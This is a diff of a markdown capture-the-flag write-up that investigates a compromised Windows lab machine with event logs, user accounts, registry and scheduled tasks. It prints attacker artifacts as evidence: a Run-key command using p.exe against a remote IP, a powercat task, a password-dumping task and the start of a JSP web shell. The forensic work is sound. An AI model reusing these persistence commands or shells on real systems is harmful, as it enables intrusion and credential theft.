@@ -5,13 +5,16 @@
 - [References](#references)
 
 ## Room information
-```
+
+```text
+Type: Challenge
 Difficulty: Easy
 OS: Windows
 Subscription type: Free
 Description: A windows machine has been hacked, its your job to go investigate this windows machine 
              and find clues to what the hacker might have done.
 ```
+
 Room link: [https://tryhackme.com/r/room/investigatingwindows](https://tryhackme.com/r/room/investigatingwindows)
 
 ## Solution
@@ -19,6 +22,7 @@ Room link: [https://tryhackme.com/r/room/investigatingwindows](https://tryhackme
 ### Connect via RDP
 
 We start by connecting via RDP with `xfreerdp`
+
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/HeartBleed]
 └─$ xfreerdp /v:10.10.95.87 /cert:ignore /u:Administrator /p:letmein123! /h:960 /w:1500 +clipboard 
@@ -26,12 +30,14 @@ We start by connecting via RDP with `xfreerdp`
 [15:04:33:834] [201350:201351] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
 <---snip--->
 ```
+
 Next, we open both an elevated command prompt (cmd.exe) window and a PowerShell window.
 
 ### Whats the version and year of the windows machine?
 
 We can get this information with a combination of `systeminfo` and `findstr` in the `cmd.exe` window
-```
+
+```text
 C:\Users\Administrator>systeminfo | findstr /i os
 Host Name:                 EC2AMAZ-I8UHO76
 OS Name:                   Microsoft Windows Server 2016 Datacenter
@@ -48,7 +54,8 @@ That ought to be `Administrator` since we logged in via RDP (logon type 10) very
 
 But we can get this information with `net user` in the cmd.exe window.  
 First we list all local users
-```
+
+```text
 C:\Users\Administrator>net user
 
 User accounts for \\EC2AMAZ-I8UHO76
@@ -60,7 +67,8 @@ The command completed successfully.
 ```
 
 Then we check each user's last logon time like this
-```
+
+```text
 C:\Users\Administrator>net user john
 User name                    John
 Full Name                    John
@@ -90,6 +98,7 @@ The command completed successfully.
 ```
 
 Alternatively, we can check the security event log for event IDs 4624 (An account was successfully logged on) with `Get-EventLog` and `Select-Object` in the PowerShell window
+
 ```powershell
 PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{Logname='Security';ID=4624} -MaxEvents 10 | Select-Object @{N='User'; E={$_.Properties[5].Value}}, TimeCreated
 
@@ -108,9 +117,10 @@ SYSTEM        9/14/2024 12:51:18 PM
 ```
 
 ### When did John log onto the system last?
- 
+
 We have already seen this in question #2
-```
+
+```text
 C:\Users\Administrator>net user john
 User name                    John
 Full Name                    John
@@ -143,7 +153,8 @@ The command completed successfully.
 
 We can see this in the autostart `Run` registry key.  
 Check from cmd.exe
-```
+
+```text
 C:\Users\Administrator>reg.exe QUERY "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
 
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
@@ -151,7 +162,8 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 ```
 
 Or check from PowerShell
-```
+
+```powershell
 PS C:\Users\Administrator> Get-Item "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
 
@@ -166,7 +178,8 @@ Run                            UpdateSvc : C:\TMP\p.exe -s \\10.34.2.3 'net user
 ### What two accounts had administrative privileges (other than the Administrator user)?
 
 We can start by checking what users are currently in the local `Administrators` group
-```
+
+```text
 C:\Users\Administrator>net localgroup Administrators
 Alias name     Administrators
 Comment        Administrators have complete and unrestricted access to the computer/domain
@@ -180,10 +193,11 @@ Jenny
 The command completed successfully.
 ```
 
-### Whats the name of the scheduled task that is malicous.
+### Whats the name of the scheduled task that is malicous
 
 We can check scheduled tasks with the `schtasks` command
-```
+
+```text
 C:\Users\Administrator>schtasks
 
 Folder: \
@@ -202,10 +216,12 @@ TaskName                                 Next Run Time          Status
 INFO: There are no scheduled tasks presently available at your access level.
 <---snip--->
 ```
+
 The list is quite long but we can start checking tasks in the root folder.
 
 This task certainly looks suspicious
-```
+
+```text
 C:\Users\Administrator>schtasks /Query /TN "Clean file system" /V /FO LIST
 
 Folder: \
@@ -238,6 +254,7 @@ Repeat: Until: Time:                  Disabled
 Repeat: Until: Duration:              Disabled
 Repeat: Stop If Still Running:        Disabled
 ```
+
 The tool running is `powercat` - a netcat clone in PowerShell.
 
 ### What file was the task trying to run daily?
@@ -255,7 +272,8 @@ See question above and the `Start Date` line.
 ### During the compromise, at what time did Windows first assign special privileges to a new logon?
 
 We check the security event log for event IDs 4672 (Special privileges assigned to new logon) with `Get-EventLog` in the PowerShell window
-```
+
+```powershell
 PS C:\Users\Administrator> Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 25 -Oldest
 
 
@@ -289,12 +307,14 @@ TimeCreated                     Id LevelDisplayName Message
 3/2/2019 4:04:49 PM           4672 Information      Special privileges assigned to new logon....
 3/2/2019 4:04:52 PM           4672 Information      Special privileges assigned to new logon....
 ```
+
 From the hint we see that the answer is the event with a timestamp ending in `:49` seconds.
 
 ### What tool was used to get Windows passwords?
 
 This schedule task runs the password dumping tool
-```
+
+```text
 C:\Users\Administrator>schtasks /Query /TN "GameOver" /V /FO LIST
 
 Folder: \
@@ -327,13 +347,15 @@ Repeat: Until: Time:                  None
 Repeat: Until: Duration:              Disabled
 Repeat: Stop If Still Running:        Disabled
 ```
+
 If you don't recognize the tool and it's syntax you may need to do some additional Googling.  
 Or check the contents of the file `C:\TMP\mim-out.txt`.
 
 ### What was the attackers external control and command servers IP?
 
 The answer can be found in the `hosts` file
-```
+
+```text
 C:\Users\Administrator>type c:\Windows\System32\Drivers\etc\hosts
 # Copyright (c) 1993-2009 Microsoft Corp.
 #
@@ -375,7 +397,8 @@ C:\Users\Administrator>type c:\Windows\System32\Drivers\etc\hosts
 ### What was the extension name of the shell uploaded via the servers website?
 
 We check the root folder of IIS
-```
+
+```text
 C:\Users\Administrator>dir c:\inetpub\wwwroot
  Volume in drive C has no label.
  Volume Serial Number is F078-2619
@@ -393,7 +416,8 @@ C:\Users\Administrator>dir c:\inetpub\wwwroot
 ```
 
 And checks the contents of the `tests.jsp` file
-```
+
+```text
 C:\Users\Administrator>type c:\inetpub\wwwroot\tests.jsp
 <%@ page import="java.util.*,java.io.*"%>
 <%
